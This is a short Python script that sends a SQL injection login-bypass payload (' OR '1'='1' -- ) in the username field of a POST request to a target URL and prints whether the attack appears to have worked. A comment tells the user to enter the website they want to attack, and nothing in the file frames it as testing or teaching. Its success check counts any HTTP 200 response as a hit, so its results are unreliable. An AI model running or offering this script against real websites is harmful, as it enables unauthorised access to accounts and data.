import requests

def perform_sql_injection(url, injection_string):
    try:
       
        payload = {"username": injection_string, "password": "any_password"}
        response = requests.post(url, data=payload)

       
        if "Welcome" in response.text or response.status_code == 200:
            print(f"Possible SQL Injection successful with payload: {injection_string}")
        else:
            print("SQL Injection attempt failed.")
    except requests.RequestException as e:
        print(f"Error occurred: {e}")

if __name__ == "__main__":
    target_url = "URL"  # input the url of website you want to perform attack.
    injection_string = "' OR '1'='1' -- "
    
    perform_sql_injection(target_url, injection_string)
